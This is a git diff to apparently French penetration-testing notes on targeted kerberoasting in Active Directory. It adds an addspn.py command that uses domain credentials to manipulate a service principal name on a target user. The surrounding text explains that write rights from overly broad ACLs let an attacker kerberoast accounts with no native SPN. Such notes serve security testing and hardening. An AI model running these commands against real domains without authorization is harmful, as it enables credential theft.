@@ -67,6 +67,17 @@ Pour retirer le SPN après usage avec addspn.py :
 ```bash
 addspn.py -u '<domain>\<user>' -p '<password>' -r -t <target_user> -s
 ```
+```bash
+addspn.py ldap://<IP-DC> \
+-u 'DOMAIN\USER' \
+-p 'PASSWORD' \
+-r \
+-t USER-CIBLE \
+-s NOM_SPN \
+-c
+```
+
+
 **Pourquoi c'est puissant**
 
 Ça permet de kerberoaster des comptes qui n'auraient normalement jamais été des cibles (pas de SPN natif), du moment que tu as un droit d'écriture sur l'objet. C'est très fréquent dans les configs AD mal durcies où des délégations de droits sont trop larges (souvent via des groupes genre "Help Desk" avec des ACL trop permissives).
